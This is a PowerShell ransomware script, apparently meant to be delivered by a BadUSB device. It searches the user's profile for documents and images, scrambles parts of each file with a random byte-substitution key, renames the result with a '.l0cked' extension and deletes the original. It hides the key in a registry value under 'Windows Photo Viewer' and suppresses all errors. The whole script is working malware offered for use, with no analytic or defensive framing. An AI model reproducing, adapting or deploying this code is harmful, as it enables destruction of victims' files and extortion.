#Note: to make it run on bad USB, concat those commands into one line separate with ';'
$ErrorActionPreference= 'silentlycontinue'
#Functions
Function genKey()
{
    $keyNums = 0..255
    $keyNums = $keyNums | Sort-Object {Get-Random} #shuffle
    $keyNums #return key array
}

Function encrypt($keyNums, $fileList)
{
    foreach($i in 0..($fileList.Length-1))
    {

        $fileBytes = [System.IO.File]::ReadAllBytes($fileList[$i])
        
        #Even partial encryption algo

        $k = 0 #start point to write bytes
        foreach($j in 1..10)
        { 
            $lim = 0
            $eachWrite = 100000
            if(($k + $eachWrite) -ge $fileBytes.Length) {$lim = $fileBytes.Length} else {$lim = $k + $eachWrite}
            foreach($k in $k..($lim-1))
            {
                $fileBytes[$k] = $keyNums[$fileBytes[$k]] #shift bytes  
            }
            $k = [Math]::Floor($fileBytes.Length/10) * $j #change start point to next 10%
        }
        

        $newName = $fileList[$i] + ".l0cked"
        try
        {
            [System.IO.File]::WriteAllBytes($newName, $fileBytes)
            Remove-Item $fileList[$i]
        }    
        catch{}
    }

}

Function fileList()
{
    $files = cmd /c where /r "$env:USERPROFILE" *.txt *.xlsx *.docx *.doc *.ppt *.pptx *.accdb *.png *.jpg *.jpeg
    $List = $files -split '\r'
    $List #return file list
}

#Main Program
$regKey = (Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows Photo Viewer" -Name "array" -ErrorAction Ignore ).array
if($regKey.Length -eq 913)
{ Exit }

$keyNums = @(genKey)
$fileList = @(fileList)
encrypt $keyNums $fileList

$keyNums = $keyNums -join ","
New-ItemProperty -Path "HKCU:\SOFTWARE\MICROSOFT\Windows Photo Viewer" -Name "array" -Value $keyNums -Force >$null

#Main Program


